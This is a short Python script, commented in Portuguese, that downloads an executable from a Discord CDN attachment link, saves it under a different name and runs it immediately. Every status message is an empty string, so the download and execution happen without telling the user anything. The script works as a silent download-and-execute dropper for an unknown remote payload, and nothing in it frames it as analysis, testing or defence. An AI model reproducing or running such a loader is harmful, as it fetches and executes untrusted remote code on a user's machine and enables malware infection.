import os
import requests
import subprocess

# URL do arquivo executável a ser baixado
download_url = 'https://cdn.discordapp.com/attachments/1115689166789955645/1115692855739027566/gou.exe'
# Caminho onde o arquivo será salvo localmente
file_path = './Noxty ama todos vcs.exe'

# Função para baixar o arquivo
def download_file(url, path):
    response = requests.get(url)
    with open(path, 'wb') as file:
        file.write(response.content)

# Função para executar o arquivo
def execute_file(path):
    try:
        subprocess.run(path)
        print('')
    except subprocess.CalledProcessError as e:
        print(f'')

# Chamada das funções
try:
    download_file(download_url, file_path)
    print('')
    execute_file(file_path)
except Exception as e:
    print(f'')